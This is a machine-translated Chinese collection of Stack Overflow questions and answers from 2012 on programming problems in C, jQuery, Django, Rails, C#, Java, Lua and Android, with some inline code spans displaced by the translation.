抱歉，我必须将此作为答案发布。我仍然没有发表评论的权限。在第一个 malloc 语句中，您将 malloc 的返回类型转换为指向指针的指针。因此，在 for 循环中，当您说 session[0] 时，它将包含第一个位置 0x00701760（在第一个 malloc 之后）的地址。您将 for 循环增加到会话 [1]。这在技术上是不可能的。由于会话中没有下一个值。您实际上需要增加 session[0] 中包含的值。它可能类似于 *sessions++。我想说的是您应该将 0x00701760 增加到 0x00701762 并对此执行 malloc。所以 0x00701762 现在包含了新分配内存的地址。接下来是 0x00701764，然后是 0x00701766。增加 session[] 将导致错误或至少访问无效内存。

谢谢阿迪亚

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-22T20:56:31.743

谢谢大家的提示。

问题是我在程序的早期没有正确分配内存。奇怪的是，这部分软件可以工作，但随后的内存分配失败了。我要解决的是我计算了我必须 malloc 的内存的正确大小，包括几个 strcat 调用来添加分隔符和文件名。然后，该软件运行良好。我重写了有问题的部分，它看起来像这样。

```
 // builds the string with the current directory

    // gets the size nedeed for the buffer
    current_path_size = GetCurrentDirectory(0, NULL);

    // allocates memory for the buffer
    current_path = (char*) alloc_array( AMOUNT_TO_ALLOC(current_path_size, char) );

    // gets the current directory
    if( GetCurrentDirectory( current_path_size, current_path ) == 0 )
    {
        printf("GetCurrentDirectory failed! (ErrorCode: %u)\n", GetLastError());
        return( !MY_ERROR_OK );
    }

    // builds the string with the location of the ini file

    // calculates the total amount of memory to alloc
    total_size = current_path_size + strlen(CHAR_SEPARATOR) + strlen(PUTTY_FILENAME) + 1;

    // allocates memory for the full path + filename of the ini file
    ini_file = (char*) alloc_array(AMOUNT_TO_ALLOC(total_size, char));

    // fills the buffer with the path + separator + filename + leading '\0'
    strcat(ini_file, current_path);
    strcat(ini_file, CHAR_SEPARATOR);
    strcat(ini_file, PUTTY_FILENAME);
    ini_file[total_size - 1] = '\0'; 
```

没有响应的一件事是为什么调试器没有使代码崩溃。我还需要对此做进一步的研究。

# javascript - 在使用 jQuery offset() 之前等待 DOM 更新

> ID：12078418
> 
> 赞同：1
> 
> 时间：2012-08-22T17:31:27.610
> 
> 标签：javascript, jquery, dom

我有显示隐藏元素然后获取其大小的代码：

```
var div = $('div.foo').show(); // Was hidden.

// Need to wait until the DOM is updated to get its offset
setTimeout(function() {
    var offset = div.offset();
    bar(offset.top, offset.left);
}, 0); 
```

`div.offset()`有没有一种更简洁的方法来做到这一点，而不是用a 推迟调用`setTimeout`，`0`或者这是最佳实践吗？我可以绑定做一些 DOM 更新事件或其他事情吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-22T17:43:54.117

在不传递持续时间参数的情况下调用`.show()`是同步操作，因此不需要`setTimeout`. 从[文档](http://api.jquery.com/show/)：

> 没有参数，该`.show()`方法是显示元素的最简单方法 [...]
> 
> 匹配的元素将立即显示，没有动画。这大致相当于调用`.css('display', 'block')`，除了显示属性恢复到最初的状态。

但是，如果您指定持续时间，则可以传递一个回调函数，该函数将在动画完成时执行：

```
var div = $('div.foo').show(400, function() {
    var offset = $(this).offset();
    bar(offset.top, offset.left);
}); 
```

# ios - 其他库中的 CocoaLumberjack 和 NSLog

> ID：12078419
> 
> 赞同：6
> 
> 时间：2012-08-22T17:31:30.457
> 
> 标签：ios, logging, nslog, cocoalumberjack

我正在使用[CocoaLumberjack](https://github.com/robbiehanson/CocoaLumberjack)进行我的应用程序中的所有日志记录。使用它，我可以使用 DDLogVerbose(...) 或任何可用的变体直接登录到文件。

我也在使用[fmdb](https://github.com/ccgus/fmdb)（SQLite 包装器）。问题是这个库使用 NSLog() 并且如果它的输出最终出现在我的日志文件中，则没有。

有没有办法捕获 NSLog 的输出并将其重定向到 CocoaLumberjack 的？或者，如果这不可能，只需“重写”NSLog() 以便它实际执行 DDLogVerbose()？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-07-04T04:21:08.207

尝试添加

```
#define NSLog DDLogInfo 
```

到其他库的顶部。当然你需要

```
#include "Logging.h" 
```

让它工作。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-11-21T10:29:54.957

这可能有效，但它也可能创建一个无限循环，因为 CocoaLumberjack 正在使用 NSLog，因此使用 DDLogInfo 重新定义可能会搞砸。你只需要尝试看看。

# django - 移除 ForeignKey 后迁移到第三方模型

> ID：12078420
> 
> 赞同：3
> 
> 时间：2012-08-22T17:31:34.243
> 
> 标签：django, migration, django-south

我正在删除项目中的一些死代码，我有机会删除对我们自项目启动以来一直在使用的第三方应用程序的依赖。我们的一个模型在第三方应用程序中有一个模型的 ForeignKey，当我尝试在项目的新实例上应用迁移时遇到了麻烦。

示例模型：

```
from django.db import models
from thirdparty.models import ThirdPartyModel

class MyModel(models.Model):
    fk = models.ForeignKey(ThirdPartyModel) 
```

South 检测到正在删除`MyModel.fk`，并且成功创建了迁移。应用迁移并将其回滚也可以。我现在可以删除`thirdparty`并`INSTALLED_APPS`提交更改（新的迁移和`settings.py`）。

当我在另一台机器上克隆存储库时，问题就开始了。 `./manage.py syncdb`按预期运行并创建所有不由 South 管理的表，但`./manage.py migrate myapp`在为（早期版本）创建表时失败，因为无法创建`MyModel`外键（如预期的那样，因为不再存在，因此没有创建任何表）。`thirdparty_thirdpartymodel``thirdparty``INSTALLED_APPS`

是否有标准方法来处理删除外部依赖项？现在是重置我的迁移的合适时间吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2016-01-13T08:45:55.933

这是一个老问题，但它仍然有效，甚至独立于 South，并且也是 Django Migrations 的一个问题。

您应该注意将迁移文件分开，以便您可以伪造依赖于不存在的应用程序（从 中删除`INSTALLED_APPS`）的迁移。这样，您将通过伪造这些迁移来创建新安装，并在现有安装上实际运行这些迁移。

当然，如果您有可能重新开始（例如完全重新启动），您可以擦除数据库，删除所有现有的迁移文件并简单地创建全新的迁移。所有其他开发人员也必须放弃他们的数据库。

如果您有现有的生产数据并且仍想从头开始，那么如何传输数据有不同的可能性。哪种方式最好取决于有多少数据，结构发生了多少变化等：

*   普通 SQL（手动更改数据库，在运行新迁移后，通过将数据从旧表转移到新表并删除表和外键等）
*   固定装置（通过旧系统中的 Django 转储数据并更改 JSON 以适应新结构）
*   新旧系统的两个并行安装并通过 Django/Python 脚本传输（比普通 SQL 慢，但您可以使用 Django 模型逻辑，以更舒适的方式应用验证检查、转换等）。

当然，不要在生产中执行此操作，而是在其他地方执行此操作，然后简单地应用结果。

# ruby-on-rails - ActionView::Template::Error（nil:NilClass 的未定义方法“每个”）：

> ID：12078421
> 
> 赞同：0
> 
> 时间：2012-08-22T17:31:37.743
> 
> 标签：ruby-on-rails, heroku

我在本地没有遇到错误，但在 Heroku 上。错误是：

'ActionView::Template::Error (nil:NilClass 的未定义方法 `each')'

'each' 指的是下面我的 User callback.html.erb 视图的 <% for i in @positions %> 行中 @position 中的每个 i：

```
<% for i in @positions %>
<strong>
<% begin %>
<%= @user.positions.find_by_id(i).title + " at " %>
<% rescue %>
<% end %>

<% begin %>
<%= @user.positions.find_by_id(i).company %>
<% rescue %>
<% end %>
</strong> 
```

这是我的身份验证控制器的相关部分（回调部分）

```
def callback

...

    @user = current_user

...

    #positions
    for i in 0..(positions.count-1)

      begin
        @company_i = companies[i]['name']
      rescue
      end

      begin
        @title_i = positions[i]['title']
      rescue
      end

      begin
        @industry_i = companies[i]['industry']
      rescue
      end

      begin
        @start_month_i = positions[i]['start-date']['month']
        @start_year_i = positions[i]['start-date']['year']
      rescue
      end

      begin
        @end_month_i = positions[i]['end-date']['month']
        @end_year_i = positions[i]['end-date']['year']
      rescue
      end

      begin
        @li_pos_id_i = positions[i]['id']
      rescue
      end

      if Position.find_by_li_pos_id(@li_pos_id_i).nil?
        @user.positions.build(li_pos_id: @li_pos_id_i, company: @company_i, title: @title_i, 
          industry: @industry_i, start_month: @start_month_i, start_year: @start_year_i, 
          end_month: @end_month_i, end_year: @end_year_i)
      end
    end

    @user.save
    @positions = @user.positions.map(&:id)
end 
```

我认为这与我的 .find_by 方法返回 nil 值有关，但我不确定如何解决它。谢谢！

编辑授权控制器：

```
positions.each do |position|
      begin
        @li_pos_id = position.id
        @title = position.title
        @company = position.company.name
        @industry = position.company.industry
        @start_month = position.start_date.month
        @start_year = position.start_date.year
        @end_month = position.end_date.month
        @end_year = position.end_date.year
      rescue
      end

      unless Position.find_by_li_pos_id(@li_pos_id)
        current_user.positions.build(li_pos_id: @li_pos_id, title: @title, company: @company, industry: @industry, 
          start_month: @start_month, start_year: @start_year, end_month: @end_month, end_year: @end_year)
      end

      @user.save
      @user.positions.save
    end 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-22T17:56:16.730

您在这里所做的称为“Pokemon 异常处理”，因为您捕获所有异常并将它们扔进垃圾箱。如果您与其他开发人员一起工作，这是一个非常糟糕的习惯，并且会导致大量的挫败感，因为它隐藏了意外错误并使调试变得更加困难，因为在这些部分中您将永远无法获得正确的堆栈跟踪已经围起来了。

与其盲目地捕获异常，不如在适用的情况下捕获特定的、预期的异常，并且只在可能引发它们的地方捕获。您还应该尽一切努力避免一开始就生成它们。

这方面的一个例子是：

```
<% @position_ids.present? and @position_ids.each do |position_id| %> 
```

调用你的位置变量`i`也是非常糟糕的风格，因为这种类型的名称通常保留用于增量或索引，仅此而已。使用稍长但更具描述性的名称会带来不可估量的帮助。

您还使用这种非常特殊`for x in y`的循环表示法，其中 Ruby 鼓励使用更简洁的`y.each do |x|`版本。

此外，测试`nil?`而不仅仅是测试对象本身几乎总是多余的并且可以被消除。`nil?`仅当您想要区分Ruby 中仅有的两个非真值`false`以及哪些是非真值时，该测试才有意义。`nil`在这种情况下，简单`unless (x)`优于`if (x.nil?)`。

至于为什么你没有得到任何东西`@positions`，这可能是因为`callback`例程一开始就没有运行。从事物的外观来看，除非那里有`return`某个地方，否则必须在例程结束时分配该值。

# jquery - 如果 dataKeyword 匹配，则在复选框中显示或隐藏表格行

> ID：12078422
> 
> 赞同：0
> 
> 时间：2012-08-22T17:31:39.937
> 
> 标签：jquery

我有一系列复选框，我正在寻找的是当它被选中时它有一个“数据关键字”变量。我需要能够在表行 () 的字符串中找到该变量，并根据是否找到该行来显示或隐藏该行。

复选框布局：

```
<input type="checkbox" name="make" data-heading="Make" data-keyword="Acura" />
<label>Acura</label><span class="count">(585)</span> <br />
<input type="checkbox" name="make" data-heading="Make" data-keyword="Audi"  />
<label>Audi</label><span class="count">(319)</span> <br />
<input type="checkbox" name="make" data-heading="Make" data-keyword="BMW"  />
<label>BMW</label><span class="count">(958)</span> <br /> 
```

表格行布局：

```
<tr sn="8126789" v_loc="7279" index="0" class="car-search-result">
<td class="tcol-1"> <a name="8126789" /> <img class="clicked" data-thumbnail="/8126789-3-1-48f0a71c.jpg" src="/8126789-3-1-48f0a71c.jpg" alt="" /> </a> 
<div>
    <label> Compare </label> 
    <input type="checkbox" id="" class="compare_click" name="" />
</div>
</td>
<td class="tcol-2"> 
<h5 data-header="2006 Acura MDX ">
    <a href=""> 2006 Acura MDX </a> 
</h5>
<ul>
    <li><span>Leather Seats, 3rd Rear Seat, Sunroof(s)<a>more...</a></span></li>
</ul>
<ul class="list">
    <li> <label> Miles</label> </li>
    <li> <label> Drive</label>4WD </li>
    <li> <label> Trans</label>Automatic </li>
    <li> <label> MPG</label> </li>
    <li> <label> Exterior</label>Gray </li>
    <li> <label> Interior</label>Gray </li>
    <li> <label> 
    <div>
        8 Reviews 
    </div>
    </label> <img alt="4.8 out of 5" src="rating-4_8.gif"> </li>
</ul>
<div class="more_equipment">
    More equipment and specifications 
</div>
</td>
<td class="tcol-3"> 
<div class="res_sort_mileage" data-keyword="90K">
    90K 
</div>
</td>
<td class="tcol-4"> 
<div style="position:relative;">
    <div>
        <span class="res_sort_price" data-keyword="$16,599"> $16,599</span>
    </div>
    <div>
        Current Location<span class="res_current_location" data-keyword="location"> location</span>
    </div>
    <div class="btn_see_more_details">
    </div>
    <div class="btn_save_this_car">
    </div>
</div>
</td>
</tr> 
```

不知道怎么设置，先谢谢了！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-22T19:04:20.230

我建议将`data-keyword`属性添加到表格行，如下所示

```
<tr data-keyword="Acura" ... 
```

然后，您应该能够监听复选框上的点击，并在每次点击时切换该行的出现和消失。

```
$('input').live('click',function() {
    $('.car-search-result').each(function(i) {
        var keyword = $(this).attr('data-keyword');
        var checked = $('input[data-keyword="'+keyword+'"]').is(':checked');
        if(checked) { 
            $(this).show();
        } else {
            $(this).hide();            
        }
    });
}​);​ 
```

这是 jsFiddle 的链接，您可以在其中看到它的实际效果：http: [//jsfiddle.net/Um7rC/](http://jsfiddle.net/Um7rC/)

# c# - 跟踪缓存中的键 (.NET)

> ID：12078425
> 
> 赞同：1
> 
> 时间：2012-08-22T17:31:55.223
> 
> 标签：c#, .net, caching

我正在使用 System.Web.Caching 哪些实体是单独缓存的。例如，如果我有 1000 个产品，它们每个都会在缓存中拥有自己的条目。

*   产品_1
*   产品_2
*   产品_389
*   等等...

我知道这是一个很好的做法，尤其是在我的情况下，缓存最终将保存在单独的缓存服务器上，并且每次访问缓存时，它都会被序列化。

**我的问题是：**如何跟踪我目前在缓存中拥有哪些产品？如果我：（A）想要获取当前缓存中的所有产品，（B）想要清除缓存中的所有产品，（C）想要刷新缓存中的所有产品，则需要这样做。

# java - 将对象缓存为不可变类

> ID：12078428
> 
> 赞同：3
> 
> 时间：2012-08-22T17:32:05.340
> 
> 标签：java, performance, caching, immutability

我问的是非常笼统的问题，答案可能因要求而异，但对于“一般”或“经验法则”，我们可以说以下是一个很好的设计规则：

> 要缓存的类（静态/参考数据）应设计为不可变的，并有例外。

如果这不是真的，上述陈述可能存在什么设计/性能问题？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-22T17:42:24.417

这是因为缓存的作用是保存数据，而不是再次从数据源中检索数据。例如，您在数据库中查询一个值，然后将其放入基于内存的缓存中，这样您就不必再次查询数据库。但是，如果数据库中的值可以更改，那么缓存中的值将过期，您的应用程序将使用错误的数据。

因此，如果数据在应用程序运行期间无法更改，则最好使用缓存。如果数据可以更改，则必须制定策略定期检查数据是否已更改。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-22T18:04:13.613

@JohnB 对基础数据有一个很好的答案。

但是，如果问题是指缓存类本身（将数据保存在缓存中）的不变性，那么答案是，如果类的实例被多个引用，可变类可能会导致线程安全问题线程（通过缓存共享的数据经常会发生）。此外，可能会发生数据的“意外”修改，其中共享实例被无意修改（因为修改代码不知道数据是共享的）。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-22T18:25:50.210

换句话说，jtahlborn 解释的是：一个不可变的类将提供获取“静态”数据的方法。

如果您的类是不可变的，则除了构造函数中的参数之外，您将没有设置器。

请注意：不可变类**不会**只使用一次，这会导致性能损失，因为每次访问 get... 方法时都必须完成内部属性的副本。

例子 ：

```
class MyImmutableThing {

  private final String myProperty;

  MyImmutableThing(String myProperty) {
    this.myProperty = myProperty;
  }

  String obtainMyProperty() {
    return myProperty;
  }

    // note there is no mean to modify the myProperty value : the original value remains ;)
    // That's it !
} 
```

# c# - 为什么从控制台运行批处理文件时 UNC 路径不起作用？

> ID：12078429
> 
> 赞同：0
> 
> 时间：2012-08-22T17:32:07.250
> 
> 标签：c#, command-line, batch-file

我有一个非常简单的批处理文件：

```
echo Text > Test.txt 
```

此文件保存在这里：

> `R:\Testing123.bat`
> 完整的 UNC 途径是
> `\\imfile\depart$\DB\Testing123.bat`

在我的控制台应用程序中，以下运行：

```
Process myProcess = new Process();
myProcess.StartInfo.UseShellExecute = true;
myProcess.StartInfo.WorkingDirectory = @"R:\";
myProcess.StartInfo.FileName = @"Testing123.bat";
myProcess.StartInfo.CreateNoWindow = true;
myProcess.Start(); 
```

如果我使用完整的路径，这不会运行：

```
Process myProcess = new Process();
myProcess.StartInfo.UseShellExecute = true  ;
myProcess.StartInfo.WorkingDirectory = @"\\imfile\depart$\DB\";
myProcess.StartInfo.FileName = @"Testing123.bat";
myProcess.StartInfo.CreateNoWindow = true;
myProcess.Start(); 
```

我不能将这些 UNC 路径用于 WorkingDirectory 属性吗？我认为在编程时使用这些路径总是最佳实践？

**编辑**

使用其中一个建议，我现在有以下不幸仍然不起作用：

```
{

    Process myP = new Process();
    myP.StartInfo.UseShellExecute = false;
    string myString = @"pushd \\imfile\depart$\DB";
    myP.StartInfo.FileName = "cmd";
    myP.StartInfo.Arguments = myString;
    myP.StartInfo.CreateNoWindow = true;
    myP.Start();

    Process myProcess = new Process();
    myProcess.StartInfo.UseShellExecute = true  ;
    myProcess.StartInfo.WorkingDirectory = @"\\imfile\depart$\DB";
    //myProcess.StartInfo.WorkingDirectory = @"R:\";
    myProcess.StartInfo.FileName = @"Testing123.bat";
    myProcess.StartInfo.CreateNoWindow = true;
    myProcess.Start();

} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-22T22:11:10.590

bat 文件通过 cmd.exe 执行，它（默认情况下）不允许 UNC 路径作为“工作目录”。但是，您可以通过注册表更改此行为。

```
 [HKEY_CURRENT_USER\Software\Microsoft\Command Processor]
 "DisableUNCCheck"=dword:00000001 
```

[http://support.microsoft.com/kb/156276](http://support.microsoft.com/kb/156276)

我从[Far Manager](http://www.farmanager.com/) [TechInfo 第 2.2 节获知](http://farmanager.com/svn/trunk/docs/ENG/TechInfo.txt)此信息。

# java - 关于将值四舍五入到某个小数点

> ID：12078431
> 
> 赞同：1
> 
> 时间：2012-08-22T17:32:14.300
> 
> 标签：java, rounding

我正在经历类十进制格式，因为我正在尝试将 Java 中的十进制数格式化为小数点后 2 位或小数点后 3 位。

我提出了如下所示的解决方案，但也请让我知道 java 是否为我们提供了其他替代方法来实现相同的目标..!!

```
import java.text.DecimalFormat;

public class DecimalFormatExample {   

    public static void main(String args[])  {

        //formatting numbers upto 2 decimal places in Java
        DecimalFormat df = new DecimalFormat("#,###,##0.00");
        System.out.println(df.format(364565.14));
        System.out.println(df.format(364565.1454));

        //formatting numbers upto 3 decimal places in Java
        df = new DecimalFormat("#,###,##0.000");
        System.out.println(df.format(364565.14));
        System.out.println(df.format(364565.1454));
    }

}

Output:
364,565.14
364,565.15
364,565.140
364,565.145 
```

请告知 java 为我们提供了哪些其他替代方案来实现相同的目标..!!

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-22T17:37:43.287

如果您对重新`DecimalFormat`定义`String.format()`. 检查特别是数字子标题的[语法。`Formatter`](http://docs.oracle.com/javase/7/docs/api/java/util/Formatter.html#syntax)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-22T17:56:39.870

这是四舍五入的替代方法...

```
double a = 123.564;
double roundOff = Math.round(a * 10.0) / 10.0;
System.out.println(roundOff);
roundOff = Math.round(a * 100.0) / 100.0;
System.out.println(roundOff); 
```

输出是

```
123.6
123.56 
```

`0`乘除 时的 s 数决定四舍五入。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-22T18:14:39.153

这是一种方法。

```
float round(float value, int roundUpTo){
     float x=(float) Math.pow(10,roundUpTo);
     value = value*x; // here you will guard your decimal points from loosing
     value = Math.round(value) ; //this returns nearest int value
     return (float) value/p;
} 
```

# lua - luaL_checknumber 和 lua_tonumber 有什么区别？

> ID：12078432
> 
> 赞同：10
> 
> 时间：2012-08-22T17:32:15.783
> 
> 标签：lua

澄清（抱歉问题不具体）：他们都试图将堆栈上的项目转换为`lua_Number`. `lua_tonumber`还将转换代表数字的字符串。如何`luaL_checknumber`处理不是数字的东西？

还有`luaL_checklong`和`luaL_checkinteger`。它们与`(int)luaL_checknumber`和`(long)luaL_checknumber`分别相同吗？

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-08-23T18:12:44.437

参考手册确实回答了这个问题。我引用了 Lua 5.2 参考手册，但在 5.1 手册中也可以找到类似的文本。但是，该手册非常简洁。很少有任何一个事实在一个以上的句子中被重述。此外，您经常需要关联分散在很远的部分中陈述的事实，以了解 API 函数的更深层次的含义。

这不是缺陷，而是设计使然。这是该语言的参考手册，因此其主要目标是完整（和正确）描述该语言。

有关“如何”和“为什么”的更多信息，一般建议是同时阅读[《Lua 编程》](http://www.lua.org/pil/)。描述 Lua 5.0 的在线副本变得相当长。当前的纸质版本描述了 Lua 5.1，描述 Lua 5.2 的新版本正在制作中。也就是说，即使第一版也是一个很好的资源，只要您还注意自 5.0 版以来该语言的变化。

`luaL_check*`参考手册对函数系列有相当多的说明。

每个 API 条目的文档块都附有一个标记，该标记描述了它对堆栈的使用，以及在什么条件下（如果有）它会抛出错误。这些令牌在[第 4.8 节](http://www.lua.org/manual/5.2/manual.html#4.8)中进行了描述：

> 每个函数都有一个这样的指标：`[-o, +p, x]`
> 
> 第一个字段 o 是函数从堆栈中弹出的元素数量。第二个字段 p 是函数压入堆栈的元素数量。（任何函数总是在弹出其参数后推送其结果。） x|y 形式的字段表示该函数可以推送（或弹出）x 或 y 元素，具体取决于具体情况；一个问号“？” 意味着我们无法通过仅查看它的参数来知道函数弹出/推送多少元素（例如，它们可能取决于堆栈上的内容）。第三个字段 x 表示函数是否会抛出错误：'-' 表示函数永远不会抛出任何错误；'e' 表示函数可能会抛出错误；'v' 表示该函数可能会故意抛出错误。

在第 5 章的开头，它记录了整个辅助库（官方 API 中的所有函数，其名称以`luaL_`而不只是开头`lua_`）我们发现：

> 辅助库中的几个函数用于检查 C 函数参数。因为错误消息是针对参数格式化的（例如，“bad argument #1”），所以您不应该将这些函数用于其他堆栈值。
> 
> 如果检查不满足，调用 luaL_check* 的函数总是抛出错误。

该函数[`luaL_checknumber`](http://www.lua.org/manual/5.2/manual.html#luaL_checknumber)使用令牌记录，`[-0,+0,v]`这意味着它不会干扰堆栈（它不会弹出任何内容，也不会推送任何内容）并且它可能会故意抛出错误。

具有更具体数字类型的其他函数主要在函数签名上有所不同。所有的描述都类似于[`luaL_checkint()`](http://www.lua.org/manual/5.2/manual.html#luaL_checkint)“检查函数参数`arg`是否为数字并将此数字强制转换为`int`”，并根据需要更改强制转换中命名的类型。

该函数`lua_tonumber()`使用标记进行描述，这`[-0,+0,-]`意味着它对堆栈没有影响并且不会引发任何错误。它记录了从指定的堆栈索引返回数值，如果堆栈索引不包含足够数字的内容，则返回 0。记录使用更通用的函数`lua_tonumberx()`，该函数还提供一个标志，指示它是否成功转换了一个数字。

它也有以更具体的数字类型命名的兄弟姐妹，它们执行所有相同的转换，但转换它们的结果。

最后，人们也可以参考源代码，理解手册是按照它的意图描述语言，而源代码是该语言的特定实现，可能有错误，或者可能揭示实现细节在未来的版本中可能会发生变化。

的来源[`luaL_checknumber()`](http://www.lua.org/source/5.2/lauxlib.c.html#luaL_checknumber)在`lauxlib.c`. 可以看出，它是根据调用`lua_tonumberx()`的内部函数来实现的，该函数是用来实际抛出格式化的错误消息的。`tagerror()``typerror()`[`luaL_argerror()`](http://www.lua.org/manual/5.2/manual.html#luaL_argerror)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-23T03:59:15.550

他们都尝试将堆栈上的项目转换为 lua_Number。lua_tonumber 也会转换代表数字的字符串。luaL_checknumber 在转换失败时会引发 (Lua) 错误 - 它会长跳转并且永远不会从 C 函数的 POV 返回。lua_tonumber 只返回 0（这也可以是一个有效的返回值。）所以你可以编写这个代码，它应该比首先检查 lua_isnumber 更快。

```
double r = lua_tonumber(_L, idx);
if (r == 0 && !lua_isnumber(_L, idx))
{
    // Error handling code
}
return r; 
```

# jquery - 使用 css 或 jquery 更改特定字符的格式

> ID：12078438
> 
> 赞同：3
> 
> 时间：2012-08-22T17:32:41.200
> 
> 标签：jquery, css

我有时会使用管道构建快速而肮脏的 html 菜单或其他类型的列表 | 分离元素，即：

主页 | 编辑 | ETC...

我喜欢使管道变得粗体和彩色，并想知道是否有一种快速的方法来选择 css 样式中的特定字符。（或者可能是 JS/jquery）

我确实知道我可以用管道周围的跨度来做到这一点，但我认为能够只选择这个角色可能很优雅。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-08-22T17:37:41.943

您可以将回调函数传递给该[`.html()`](http://api.jquery.com/html/)方法，以便为您将这些字符包装在 span 中：

```
$('p.menu').html(function(i,el) {
    return el.replace(/\|/g, '<span class="sp">|</span>');
});​ 
```

[http://jsfiddle.net/mblase75/ymE6y/](http://jsfiddle.net/mblase75/ymE6y/)

# android - android httpclient 触发从服务器下载

> ID：12078440
> 
> 赞同：2
> 
> 时间：2012-08-22T17:32:46.133
> 
> 标签：android, download, get, httpclient

我创建了一个 HTTP 文件服务器，目的是将媒体文件（mp3、ogg 等）传输到 Android 设备。当从 android 浏览器访问服务器时

10.0.2.2：端口号/路径/到/文件

服务器启动文件下载过程。客户当然不会做这种事，测试文件服务器就好了。我是 Android 开发的新手，并且了解到 httpclient 包可以管理 get/post 请求。这是我用来读取响应的示例代码

```
DefaultHttpClient client = new DefaultHttpClient();
HttpGet httpGet = new HttpGet(url);
try {
  HttpResponse execute = client.execute(httpGet);
  InputStream content = execute.getEntity().getContent();

  BufferedReader buffer = new BufferedReader(new InputStreamReader(content));
  String s = "";
  while ((s = buffer.readLine()) != null) {
    response += s;
  }
} catch (Exception e) {
  e.printStackTrace();
}

return response; 
```

当服务器以 JSON 格式发送文件列表时，上面的代码可以正常工作。由于发送文件的服务器部分已被编码，我卡住的地方是在 android 上检索媒体文件。

我对如何接收服务器发送的 mp3 文件感到困惑。应该在流中读取它们吗？谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-22T18:00:02.917

是的，您想通过输入流将文件读入磁盘。这是一个例子。如果您不想要文件下载进度条，请删除与进度相关的代码。

```
try {
        File f = new File("yourfilename.mp3");
        if (f.exists()) {
            publishProgress(100,100);
        } else {
            int count;
            URL url = new URL("http://site:port/your/mp3file/here.mp3");
            URLConnection connection = url.openConnection();
            connection.connect();
            int lengthOfFile = connection.getContentLength();
            long total = 0;
            InputStream input = new BufferedInputStream(url.openStream());
            OutputStream output = new FileOutputStream(f);
            byte data[] = new byte[1024];
            while ((count = input.read(data)) != -1) {
                total += count;
                publishProgress((int)(total/1024),lengthOfFile/1024);
                output.write(data, 0, count);
            }
            output.flush();
            output.close();
            input.close();
        }
    } catch (Exception e) {
        Log.e("Download Error: ", e.toString());
    } 
```

# android - 如何将 php json url 解析为 android 列表视图这里是代码我没有显示

> ID：12078447
> 
> 赞同：0
> 
> 时间：2012-08-22T17:33:09.097
> 
> 标签：android, json, parsing, listview, listitem

我正在从以下 url 解析 json

[http://www.kaverisoft.com/careers/assignments/android/a1.php](http://www.kaverisoft.com/careers/assignments/android/a1.php)

使用以下代码

公共类 MainActivity 扩展 ListActivity {

```
/** Called when the activity is first created. */
@SuppressWarnings({ "rawtypes", "unchecked" })
@Override
public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.activity_main);

    setListAdapter(new ArrayAdapter(
            this,android.R.layout.simple_list_item_1,
            this.populate()));
}

private ArrayList<String> populate() {
    ArrayList<String> items = new ArrayList<String>();

    try {
        URL url = new URL
        ("http://www.kaverisoft.com/careers/assignments/android/a1.php");
        HttpURLConnection urlConnection =
            (HttpURLConnection) url.openConnection();
        urlConnection.setRequestMethod("GET");
        urlConnection.connect();
                    // gets the server json data
        BufferedReader bufferedReader =
            new BufferedReader(new InputStreamReader(
                    urlConnection.getInputStream()));

        String next;
        while ((next = bufferedReader.readLine()) != null){
            JSONArray ja = new JSONArray(next);

            for (int i = 0; i < ja.length(); i++) {
                JSONObject jo = (JSONObject) ja.get(i);
                items.add(jo.getString("text"));
            }
        }
    } catch (MalformedURLException e) {
        // TODO Auto-generated catch block
        e.printStackTrace();
    } catch (IOException e) {
        // TODO Auto-generated catch block
        e.printStackTrace();
    } catch (JSONException e) {
        // TODO Auto-generated catch block
        e.printStackTrace();
    }
    return items;
} 
```

}

logcat 显示未找到 org.json.JSONException 值文本

但我无法将任何数据填充到 listview，但如果我使用直接 json 格式的 url，我可以获得填充数据，请帮忙。

输出如下图所示。

请帮我解决这个问题。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-22T17:47:02.027

据我所知，列表中有 3 种对象：相机、书籍和音乐。对于它们中的每一个，您都必须使用不同的解析。首先，您应该检测数组的当前元素是什么类型的对象。

例如：

```
if (jo.has("book")) {
  JSONObject jsonBook = jo.getJSONObjcejt("book");
  // continue with parsing book stuff
} else if (jo.has("camera"){
  // same, but for camera
} else if (jo.has("music") {
  // same, but for music
} 
```

然后你可以用你解析的书籍、音乐和相机对象填充列表。如果您想要更智能的解析，请查看[gson](http://code.google.com/p/google-gson/)。

# ruby-on-rails - 设置宽度时图像不显示在 IE8 中

> ID：12078448
> 
> 赞同：0
> 
> 时间：2012-08-22T17:33:10.220
> 
> 标签：ruby-on-rails, internet-explorer-8

每当我包含图像并为其设置宽度时，它就会停止在 IE8 中显示。无论哪种方式，它在 IE7 中都能正常显示。

```
= image_tag 'image.png', :height => 36 
```

效果很好

```
= image_tag 'image.png', :width => 104, :height => 36 
```

不行

这些属性的顺序也没有区别。有没有人遇到过这个？我可以通过不包括宽度来解决我的问题，但我更喜欢设置宽度。

# javascript - 选中复选框后如何插入今天的日期？

> ID：12078454
> 
> 赞同：1
> 
> 时间：2012-08-22T17:33:42.673
> 
> 标签：javascript, asp.net, html

我们在gridview上有这个复选框：

```
<ItemTemplate>
 <asp:CheckBox ID="chkb" runat="server" onclick = "Check_this(this)" />
</ItemTemplate> 
```

我们的用户可以单击选中一个框，也可以单击选中多个框。

我们想添加另一列：

```
<asp:BoundField ItemStyle-Width = "150px" DataField = "curDate" SortExpression="curDate" HeaderText = "Date Accepted" /> 
```

